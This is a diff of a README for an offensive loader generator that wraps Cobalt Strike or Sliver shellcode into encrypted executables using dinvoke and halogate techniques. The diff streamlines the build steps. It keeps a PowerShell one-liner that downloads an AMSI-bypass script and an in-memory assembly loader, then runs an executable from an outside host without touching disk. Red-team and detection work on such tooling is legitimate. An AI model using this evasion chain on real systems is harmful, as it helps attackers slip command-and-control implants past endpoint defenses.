@@ -62,19 +62,9 @@ For CobaltStrike:
 ### Move the cobaltstrike.bin to folder input and rename to cobaltstrike.bin, then run the autogen script.
 ```
 
-2. Move the generated shellcode bin file to `input` folder
+2. Move the generated shellcode bin file to `input` folder, and rename it as format: `<c2type>.bin`
 
-3. Modify the autogen script
-For halogates loader, fill in the below three parameters in the universal autogen bash script file `autogen_halo.sh`:
-```
-...truncated...
-arch="x64"
-c2type="sliver"
-rawscfilename='sliver.bin'
-...truncated...
-```
-
-4. Run the autogen script, wait for couple of minutes and check the generated encrypted EXE in the output folder.
+3. Run the autogen script `autogen_loader.sh`, wait for couple of minutes and check the generated encrypted EXE in the output folder.
 
 ```
 ┌──(root💀TW-PenTestBox)-[~/myCodes/sn0wldr]
@@ -89,7 +79,7 @@ rawscfilename='sliver.bin'
 [!] 	dinvoke|halogate
 ```
 
-5. Since the generated EXE are Sharp Assembly, so it can be chained with the tool [PowerSharpLoader](https://github.com/F4l13n5n0w/PowerSharpLoader) to load remotely into memory without touch disk, as shown in the following example:
+4. Since the generated executable file is Sharp Assembly, it can be chained with the tool [PowerSharpLoader](https://github.com/F4l13n5n0w/PowerSharpLoader) to load remotely into memory without touch disk, as shown in the following example:
 ```
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi3.txt"));IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssembly.ps1"));Invoke-LoadAssembly -AssemblyUrl https://not.o0.rs/halosli64x2.exe -Command ""
 ```
